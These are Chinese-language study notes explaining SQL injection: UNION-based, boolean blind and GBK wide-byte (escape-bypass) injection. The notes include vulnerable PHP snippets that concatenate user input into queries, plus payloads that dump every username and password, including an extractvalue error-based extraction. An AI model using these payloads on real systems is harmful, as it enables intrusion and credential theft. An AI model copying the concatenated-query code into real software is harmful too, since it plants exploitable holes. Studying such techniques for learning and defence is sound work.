# SQL注入

sql注入是一种通过修改原sql语句的攻击手段

基本原理是用户输入恶意字符，若服务端没有对用户的输入进行有效处理，则可能触发数据库错误，进而暴露敏感信息或修改数据库

## 联合注入查询

成因：直接拼接sql语句，不加以处理，导致直接返回数据库内容、

可见于登录页面

```php
<?php
$id = $_GET['id'];
$conn = mysqli_connect("localhost", "root", "", "test");
$sql = "SELECT name, price FROM products WHERE id = $id";
$result = mysqli_query($conn, $sql);
while($row = mysqli_fetch_assoc($result)) {
    echo "Name: " . $row['name'] . "<br>";
    echo "Price: " . $row['price'] . "<br>";
}
?>
```

payload：

```sql
1 UNION SELECT username, password FROM users --
```

攻击者通过输入如上id参数，让数据库同时执行SELECT操作，输出所有的用户名和密码

## 布尔盲注

成因：不返回数据，但是查询条件不同时响应不同，且没有限制查询次数

可见于搜索框等位置

```php
<?php
$keyword = $_GET['keyword'];
$conn = mysqli_connect("localhost", "root", "", "test");
$sql = "SELECT * FROM articles WHERE title LIKE '%$keyword%'";
$result = mysqli_query($conn, $sql);
if(mysqli_num_rows($result) > 0) {
    echo "找到相关文章";
} else {
    echo "没有找到文章";
}
?>
```

payload:

```sql
test%' AND ASCII(SUBSTRING(database(),1,1))>100 -- '
```

SUBSTRING()用法：SUBSTRING(str, pos, len)

攻击者通过输入如上keyword参数，查询数据库名的第一个字符的ASCII码是否大于100，逐个判断数据库名

## 宽字节注入

成因：服务端代码与数据库编码格式不同，UTF-8的反斜杠\\\(0x5c)与后续字节在GBK编码下合成一个汉字，使转义失效

可见于对用户输入有预处理但配置不当的网站

![image-20260307000207928](C:\Users\LonelySam8\Desktop\image-20260307000207928.png)

$pdo默认开启模拟预编译，且没有指定编码格式

代码本身是UTF-8编码

如果数据库是GBK则存在宽字节注入

模拟预编译后的SQL语句：

```sql
INSERT INTO users (username, password, email, balance) VALUES ('$username', '$password', '$email', 100000)
```

$pdo会在单引号前添加一个反斜杠\\(0x5c)作为转义符

在GBK编码中，0xd55c是汉字“誠”

所以构建如下payload:

```sql
%d5' or extractvalue(1, concat(0x7e, (select group_concat(username, ':', password) from users), 0x7e)) or '
```

于是数据库将%d5\解析为”誠“，从而使单引号逃逸，闭合原sql语句

则sql语句变为

```sql
VALUES ('' or extractvalue(1111, concat(0x7e, (select group_concat(username, ':', password) from users), 0x7e)) or '', '$password', ...)
```

extractvalue用法：EXTRACTVALUE(xml_fragment, xpath_expression)

xml_fragment：要查询的XML字符串

xpath_expression：XPath表达式，用于定位要提取的节点

数字1111是无效的XML字符串，所以sql一定会报错，而后面的XPath表达式是非法的，那么sql就会抛出类似ERROR 1105 (HY000): XPATH syntax error: '...'的错误，其中...是传入的XPath的表达式内容

concat用法：CONCAT(str1, str2, ...)

用来将多个参数连为字符串

group_concat用于将分组中多行数据拼接为一个字符串

0x7e在UTF-8中是字符"~"，用来分割数据

所以最后concat会把获取到的用户名和密码作为XPath表达式传入extractvalue，并以报错的形式传出

那么最后数据库就会报错，并输出所有用户名和密码